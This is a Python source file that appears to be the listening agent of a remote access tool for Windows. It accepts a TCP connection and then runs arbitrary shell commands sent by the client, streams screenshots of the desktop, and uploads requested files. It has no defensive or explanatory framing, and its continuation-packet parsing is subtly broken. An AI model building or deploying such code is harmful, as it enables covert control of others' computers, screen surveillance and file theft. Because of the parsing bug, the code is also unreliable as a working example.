import os
import subprocess
import socket, sys
import struct, math
import pyautogui as py
import socket 
import io
import re
import pathlib

PACKET_SIZE = 10000

# Creates and connects to a client socket
def connectSocket(HOST, PORT, debug: bool = False) -> socket:
    try:
        sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
        if debug: 
            print('[+] Server Started')
            print('[+] Listening For Client Connection...')
        sckt.bind((HOST, PORT)) # Bind the socket to an adress and a port
        sckt.listen(1) # Listen for incoming connections
        client, client_addr = sckt.accept() 
        if debug:
            print(f'[+] {client_addr} Client connected to the server')   
        return client
    except (Exception): 
        return

# Implementation of the send() function with the packet system
def sendPackets(sckt: socket, dataToSend: bytearray, typeOfRequest: int,  debug: bool):
    try:
        nOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
        bytesSent = 0

        # Loop through the packets
        for i in range(nOfPacketsToSend):
            packetLength = min(PACKET_SIZE, len(dataToSend)-bytesSent).to_bytes(4, "big")
            packetPackets = (nOfPacketsToSend-(i+1)).to_bytes(2, "big")
            packetTypeOfRequest = typeOfRequest.to_bytes(1, "big")
            packetPayload = dataToSend[i*PACKET_SIZE:(i*PACKET_SIZE)+min(PACKET_SIZE, len(dataToSend)-bytesSent)]
            packet = packetLength + packetPackets + packetTypeOfRequest + packetPayload
            bytesSent += min(PACKET_SIZE, len(dataToSend)-bytesSent)

            sckt.sendall(packet)
            if debug:
                print("[SENT] Header: packetLength", packetLength, " | nOfPacketsLeft ", packetPackets, " | typeOfRequest ", typeOfRequest)
    except (Exception):
        return

# A "safer" and more convinient implementation of the standard recv() function
def recvAll(sckt: socket, n: int) -> bytearray:
    try:
        payload = sckt.recv(n)
        while (len(payload) < n):
            payload += sckt.recv(n-len(payload))
        return payload
    except (Exception):
        return b'EXIT0x02'

#                                                                              number of packets left to receive
# Implementation of the recvAll() function packet system --> packetHeader: 0x0 0x0 0x0 0x0 | 0x0 0x0 | 0x0
#                                                                                 ^       |             ^
#                                                                                 |       |             |
#                                                                           packet length | type of request (0x63 "c", 0x73 "v")
def recvPackets(sckt: socket, debug: bool = False) -> tuple:
    try:
        receivedData = b""
        packetHeader = recvAll(sckt, 7)

        packetLength = struct.unpack("i", packetHeader[:4])[0]
        packetPackets = packetHeader[4] + packetHeader[5]
        typeOfRequest = packetHeader[6]

        payload = recvAll(sckt, packetLength)
        receivedData += (payload)
        if debug:
            print("[RECEIVED] Header: packetLength: ", packetLength, " | nOfPacketsLeft ", packetPackets, " | typeOfRequest ", typeOfRequest, payload)

        # Check if an error occurred during the first packet fetching
        while packetPackets > 0:
            if not receivedData == b"EXIT0x02":
                packetHeader = recvAll(sckt, 6)

                packetLength = struct.unpack("i", packetHeader[:4])[0]
                packetPackets = packetHeader[4] + packetHeader[5]
                typeOfRequest = packetHeader[6]

                payload = recvAll(sckt, packetLength) 
                receivedData += (payload)
            else:
                return 0x00, b"EXIT0x02"
    
        return (packetHeader[6], receivedData)
    except:
        return 0x00, b"EXIT0x02"

def getCurrentDirectory() -> str:
    output = subprocess.run("cd", shell=True, capture_output=True)
    currentDir = (output.stdout[:len(output.stdout)-2]).decode()
    return currentDir

def checkIfAvailableInDirectory(currentDir: str, cmd: str, offset: int) -> bool:
    command = "dir" + " " + '"' + currentDir + '"'
    output = subprocess.getoutput(command)
    if output.find(cmd[offset:]) != -1:
        return True
    else:
        return False 


# Main server function
def mainServer(HOST, PORT, debug: bool = False):
    # Create the server-client socket
    clientSocket = connectSocket(HOST, PORT, debug)

    command = b""
    startedVideoShare = False
    currentDirectory = getCurrentDirectory()

    while True:
        typeOfRequest, command = recvPackets(clientSocket, debug)
        try:
            command: str = command.decode()
        except:
            command = "EXIT0x02"
        # DEBUG
        if debug and not command == "":
            print("[DEBUG] Command: ", command, " typeOfRequest: ", typeOfRequest)

        # Check for errors / exit command
        if command == "EXIT0x01":
            sys.exit(0)
        if command == "EXIT0x02":
            startedVideoShare = False
            clientSocket = connectSocket(HOST, PORT, debug)      

        # If the request is a string request (0x63 is "c" in ascii, it stands for char)
        if typeOfRequest == 0x63:

            # Getting current directory
            if command == "dir":
                command = command + " " + '"' + currentDirectory + '\\"'
            if command == "cd ..":
                currentDirectory = currentDirectory[:currentDirectory.rfind('\\')]
            if command.find("cd .") == -1 and command.find("cd") != -1 and not re.match("[A-Z]:", command[3:]) and checkIfAvailableInDirectory(currentDirectory, command, 3):
                currentDirectory = currentDirectory + "\\" + command[3:]
            if re.match("[A-Z]:", command):
                currentDirectory = command

            output = subprocess.run(command, shell=True, capture_output=True)
            
            # If the commmand has no output
            if output.stdout == b"":
                sendPackets(clientSocket, currentDirectory.encode() + b">", 99, debug)
            else:
                print(command)
                finalOutput = output.stdout + "\n".encode() + currentDirectory.encode() + b">"
                sendPackets(clientSocket, finalOutput, 99, debug)

            # DEBUG
            if debug and not output.stdout == "":
                print("[DEBUG] String request output: ", output.stdout)

        # If the request is a video request (0x76 is "v" in ascii, it stands for video)
        if typeOfRequest == 0x76:

            # If the video request is a video start request
            if "start" in command and not startedVideoShare:
                startedVideoShare = True
                frame = py.screenshot() # Take a screenshot
                frameBytes = io.BytesIO()
                frame.save(frameBytes, format="PNG") # Convert it to a png file
                screenBuffer = frameBytes.getvalue()
                sendPackets(clientSocket, screenBuffer, 0x76, debug) # Send the data through the network

            # If the video request if a video stop request
            if "stop" in command:
                startedVideoShare = False
                sendPackets(clientSocket, b"Video stream stopped!", 0x63, debug)
                continue
            
            # If the video request is a video continue command
            if "continue" in command:
                frame = py.screenshot()
                frameBytes = io.BytesIO()
                frame.save(frameBytes, format="PNG")
                screenBuffer = frameBytes.getvalue()
                sendPackets(clientSocket, screenBuffer, 0x76, debug)
        
        # If the request if a file request
        if typeOfRequest == 0x66:

            # If the file request is a "getfile" request
            if "getfile" in command:
                filePath = currentDirectory + "\\" + command[8:] # Construct the file path
                if checkIfAvailableInDirectory(currentDirectory, command, 8): # Check if the file is available in the currentDirectory
                    if os.path.getsize(filePath) < 2000000000: # Check if its bigger than 2GB
                        # Read and send the file data
                        with open(filePath, "rb") as reader:
                            fileData = reader.read()
                            sendPackets(clientSocket, fileData, 0x66, debug)
                else:
                    errorMessage = b"EE" + b"No file with name " + command[8:].encode() + b" in " + currentDirectory.encode() + b"\n" + currentDirectory.encode() + b">"
                    sendPackets(clientSocket, errorMessage, 0x63, debug)
                     



